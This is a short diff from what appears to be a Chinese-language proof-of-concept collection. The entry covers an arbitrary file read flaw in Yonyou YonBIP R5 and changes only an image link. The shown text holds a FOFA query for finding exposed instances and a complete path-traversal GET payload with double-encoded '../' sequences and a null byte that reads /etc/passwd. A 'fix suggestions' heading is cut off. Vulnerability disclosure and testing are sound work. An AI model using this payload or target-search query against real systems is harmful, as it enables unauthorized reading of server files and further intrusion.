@@ -8,7 +8,7 @@ FOFA：title="数字化工作台" || title="YonBIP"
 
 Payload：GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js HTTP/1.1
 
-![用友YonBIP R5旗舰版 yonbiplogin 任意文件读取漏洞](https://github.com/capable-Hub/POC/blob/main/b9iwwurioaaic8iy.png)
+![用友YonBIP R5旗舰版 yonbiplogin 任意文件读取漏洞](https://github.com/capable-Hub/POC/blob/main/images/b9iwwurioaaic8iy.png)
 
 修复建议：
 
